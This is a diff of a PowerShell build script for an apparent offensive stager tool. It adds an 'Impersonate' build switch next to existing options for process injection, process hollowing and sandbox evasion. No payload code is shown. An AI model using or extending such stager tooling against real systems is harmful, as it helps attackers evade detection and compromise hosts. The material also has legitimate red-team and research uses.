@@ -6,6 +6,8 @@ param(
     [Parameter(Mandatory=$false, HelpMessage="Technique to use for stager")]
     [ValidateSet("Inject", "Hollow")]
     [string]$Technique = "Hollow",
+    [Parameter(Mandatory=$false, HelpMessage="Attempt impersionation first if available")]
+    [switch]$Impersonate,
     [Parameter(Mandatory=$false, HelpMessage="Disable sandbox evasion")]
     [switch]$DisableSandboxEvasion,
     [Parameter(Mandatory=$false)]
@@ -69,6 +71,9 @@ function Build-Stager{
     }
     if($DisableSandboxEvasion){
         $CONSTANTS = $CONSTANTS + "%3BNO_SANDBOX"
+    }
+    if($Impersonate){
+        $CONSTANTS = $CONSTANTS + "%3BIMPERSONATE"
     }
     dotnet publish -c Release /p:DefineConstants="$CONSTANTS" --self-contained -r $Runtime $projectPath > $null
 }
